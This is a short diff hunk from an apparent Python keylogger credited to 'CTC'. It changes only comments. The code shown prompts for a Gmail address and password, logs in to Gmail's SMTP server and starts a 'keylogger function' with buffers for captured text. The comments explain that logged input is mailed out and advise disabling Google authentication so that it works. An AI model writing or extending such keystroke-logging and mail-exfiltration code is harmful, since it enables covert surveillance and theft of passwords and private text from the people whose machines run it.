@@ -23,14 +23,14 @@ print (r"""
 print ("""================================================================""")
 print(""" By: CTC """)
 
-#Asks user for input, then sets up a mail account to send the input to
+#Asks for input, then logs in to a mail account and sends the input to itself (Disable google authentication or it doesn't work)
 #Resource from: https://realpython.com/python-send-email/
 email = input('Enter Your Email: ')
 password = getpass.getpass(prompt='Password: ', stream=None)
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
-#building the keylogger function
+#Building the keylogger function
 data_to_be_encrypted = ''
 full_log = ''
 word = ''
